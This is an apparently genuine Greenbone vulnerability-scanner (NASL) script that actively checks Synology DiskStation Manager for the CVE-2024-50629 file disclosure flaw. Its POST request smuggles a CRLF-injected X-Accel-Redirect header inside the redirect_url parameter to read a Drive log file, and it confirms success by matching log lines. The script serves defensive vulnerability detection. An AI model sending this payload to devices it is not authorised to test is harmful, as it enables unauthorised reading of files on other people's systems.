# SPDX-FileCopyrightText: 2025 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:synology:diskstation_manager";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.156060");
  script_version("2025-12-19T05:45:49+0000");
  script_tag(name:"last_modification", value:"2025-12-19 05:45:49 +0000 (Fri, 19 Dec 2025)");
  script_tag(name:"creation_date", value:"2025-12-18 06:58:07 +0000 (Thu, 18 Dec 2025)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2025-03-19 06:15:15 +0000 (Wed, 19 Mar 2025)");

  script_cve_id("CVE-2024-50629");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Synology DiskStation Manager (DSM) File Disclosure Vulnerability (Synology-SA-24:20) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2025 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_synology_dsm_consolidation.nasl");
  script_mandatory_keys("synology/dsm/http/detected");
  script_require_ports("Services/www", 5000);

  script_tag(name:"summary", value:"Synology DiskStation Manager (DSM) is prone to a file
  disclosure vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"Improper encoding or escaping of output vulnerability in the
  webapi component allows remote attackers to read limited files via unspecified vectors.");

  script_tag(name:"affected", value:"Synology DSM version 7.1.1 prior to 7.1.1-42962-7, 7.2 prior
  to 7.2-64570-4, 7.2.1 prior to 7.2.1-69057-6 and 7.2.2 prior to 7.2.2-72806-1.");

  script_tag(name:"solution", value:"Update to version 7.1.1-42962-7, 7.2-64570-4, 7.2.1-69057-6,
  7.2.2-72806-1 or later.");

  script_xref(name:"URL", value:"https://www.synology.com/en-global/security/advisory/Synology_SA_24_20");
  script_xref(name:"URL", value:"https://kiddo-pwn.github.io/blog/2025-11-30/writing-sync-popping-cron");
  script_xref(name:"URL", value:"https://www.zerodayinitiative.com/advisories/ZDI-25-211/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

url = "/webapi/entry.cgi";

data = "api=SYNO.API.Auth.RedirectURI&version=1&method=run&session=finder&redirect_url=" +
       'https://dsfinder.synology.com/dsm/login?\r\nX-Accel-Redirect:/volume1/@synologydrive/log/cloud-workerd.log';

req = http_post_put_req(port: port, url: url, data: data);
res = http_keepalive_send_recv(port: port, data: req);

if (res =~ "^HTTP/1\.[01] 200" && (
    # e.g.:
    # 2024-03-16T10:56:29 (25415:22624) [INFO] job-queue-client.cpp.o(103): JobQueueClient Setup started.
    "checkpoint-task.cpp.o" >< res ||
    "job-queue-client.cpp.o" >< res ||
    egrep(string: res, pattern: "^[0-9A-Z:-]+ \([0-9]+:[0-9]+\) \[INFO\].+\.(o|cpp)", icase:FALSE))
   ) {
  body = http_extract_body_from_response(data: res);

  info["HTTP Method"] = "POST";
  info["Affected URL"] = http_report_vuln_url(port: port, url: url, url_only: TRUE);
  info['HTTP "POST" body'] = data;

  report  = 'By doing the following HTTP request:\n\n';
  report += text_format_table(array: info) + '\n\n';
  report += "it was possible to read the file 'synologydrive/log/cloud-workerd.log'.";
  report += '\n\nResult (truncated):\n' + substr(body, 0, 3000);
  expert_info = 'Request:\n\n' + req + '\n\nResponse:\n\n' + res;

  security_message(port: port, data: report, expert_info: expert_info);
  exit(0);
}

exit(99);
